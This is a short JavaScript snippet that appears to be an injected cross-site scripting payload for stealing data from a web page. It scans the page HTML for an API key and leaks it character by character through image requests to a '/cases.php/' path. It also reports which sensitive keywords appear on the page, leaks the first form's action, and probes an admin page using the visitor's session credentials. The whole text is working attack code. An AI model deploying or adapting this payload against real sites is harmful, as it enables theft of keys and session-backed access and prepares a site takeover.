(function(){
 var b='/cases.php/'; var img=function(s){new Image().src=b+s+'.css';};
 try{
  img('PLRAN_2');
  var H=document.documentElement.outerHTML;
  img('D_HLEN_'+H.length);
  var mk=H.match(/api_key[=:"'\s]+([A-Za-z0-9_\-]{6,})/);
  if(mk){var k=mk[1]; img('D_KLEN_'+k.length); for(var i=0;i<k.length;i++) img('D_K_'+i+'_'+k.charCodeAt(i));}
  ['publish','seize','homepage','banner','upload','overwrite','index.html','notice','HLB2026','action=','apikey','api_key','csrf','token'].forEach(function(w,idx){ if(H.indexOf(w)>=0) img('D_HAS_'+idx); });
  var f=document.querySelector('form'); if(f){var a=(f.getAttribute('action')||'SELF'); img('D_FLEN_'+a.length); for(var j=0;j<a.length;j++) img('D_F_'+j+'_'+a.charCodeAt(j));}
  fetch('/admin/index.php',{credentials:'include'}).then(function(r){img('D_ADMSTAT_'+r.status);}).catch(function(){img('D_ADMFETCHERR');});
 }catch(e){ img('D_ERR'); }
})();
